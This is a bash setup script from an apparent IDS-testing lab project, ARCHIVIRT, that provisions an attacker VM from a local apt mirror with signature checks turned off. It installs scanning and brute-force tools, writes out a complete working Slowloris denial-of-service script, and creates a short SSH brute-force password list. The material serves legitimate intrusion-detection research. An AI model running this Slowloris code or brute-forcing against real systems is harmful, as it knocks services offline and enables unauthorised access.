#!/bin/bash
# =============================================================================
# ARCHIVIRT - Install attack tools on attacker VM
# =============================================================================
# Author  : Yasnemanegre SAWADOGO (SPbGUPTD)
# License : MIT — https://github.com/yasnemanegre/ARCHIVIRT
# Version : 2.0.0 — 2026-05-19
#
# Installs all penetration testing tools from local apt mirror.
# IaC option B: no direct internet access from VM.
# Mirror: http://10.0.4.1:8080/
# =============================================================================

set -e

MIRROR="http://10.0.4.1:8080"

# --- Configure local apt mirror as sole source -------------------------------
echo "deb [trusted=yes] $MIRROR ./" > /etc/apt/sources.list.d/archivirt-local.list

apt-get update \
  -o Dir::Etc::sourcelist=/etc/apt/sources.list.d/archivirt-local.list \
  -o Dir::Etc::sourceparts="-" \
  -o APT::Get::List-Cleanup=0 -q 2>/dev/null

# --- Install attack tools from local mirror ----------------------------------
apt-get install -y --no-install-recommends \
  -o Dir::Etc::sourcelist=/etc/apt/sources.list.d/archivirt-local.list \
  nmap nmap-common \
  sqlmap \
  hydra \
  hping3 \
  tcpreplay \
  python3-scapy \
  curl wget \
  2>&1 | tail -5

# --- Verify nmap survived dependency resolution (workaround for apt bug) -----
if ! command -v nmap >/dev/null 2>&1; then
  echo "[ARCHIVIRT] WARNING: nmap missing after install, reinstalling explicitly..."
  apt-get install -y --no-install-recommends \
    -o Dir::Etc::sourcelist=/etc/apt/sources.list.d/archivirt-local.list \
    nmap nmap-common 2>&1 | tail -5
fi
if ! command -v nmap >/dev/null 2>&1; then
  echo "[ARCHIVIRT] ERROR: nmap still missing — SCN-001 will fail silently"
fi

# --- Install slowloris attack script -----------------------------------------
mkdir -p /opt/archivirt/attack-scripts
cat > /opt/archivirt/attack-scripts/slowloris.py << 'PYEOF'
#!/usr/bin/env python3
# Slowloris DDoS attack script for ARCHIVIRT IDS testing
import socket, time, argparse, random, string

def slowloris(host, port=80, sockets=150, duration=15):
    print(f"[ARCHIVIRT] Slowloris: {host}:{port} sockets={sockets} duration={duration}s")
    sock_list = []
    for _ in range(sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f"GET /?{''.join(random.choices(string.ascii_lowercase, k=6))} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en\r\n")
            sock_list.append(s)
        except:
            pass
    print(f"[ARCHIVIRT] {len(sock_list)} sockets open")
    start = time.time()
    while time.time() - start < duration:
        for s in list(sock_list):
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except:
                sock_list.remove(s)
        time.sleep(1)
    for s in sock_list:
        try: s.close()
        except: pass
    print("[ARCHIVIRT] Slowloris complete")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--sockets", type=int, default=150)
    p.add_argument("--duration", type=int, default=15)
    a = p.parse_args()
    slowloris(a.host, a.port, a.sockets, a.duration)
PYEOF
chmod +x /opt/archivirt/attack-scripts/slowloris.py

# --- Verify installations ----------------------------------------------------
echo "[ARCHIVIRT] Attack tools installed:"
echo "  nmap:     $(nmap --version 2>/dev/null | head -1 || echo 'NOT FOUND')"
echo "  sqlmap:   $(sqlmap --version 2>/dev/null | head -1 || echo 'NOT FOUND')"
echo "  hydra:    $(hydra -V 2>/dev/null | head -1 || echo 'NOT FOUND')"
echo "  hping3:   $(which hping3 && echo 'OK' || echo 'NOT FOUND')"
echo "  tcpreplay:$(tcpreplay --version 2>/dev/null | head -1 || echo 'NOT FOUND')"
# --- Create SSH brute-force wordlist -----------------------------------------
mkdir -p /usr/share/wordlists
cat > /usr/share/wordlists/rockyou.txt << WORDLIST
password
123456
admin
root
archivirt123
test
password123
letmein
qwerty
12345678
WORDLIST
echo "[ARCHIVIRT] wordlist created: $(wc -l < /usr/share/wordlists/rockyou.txt) passwords"
echo "[ARCHIVIRT] Attacker installation complete."
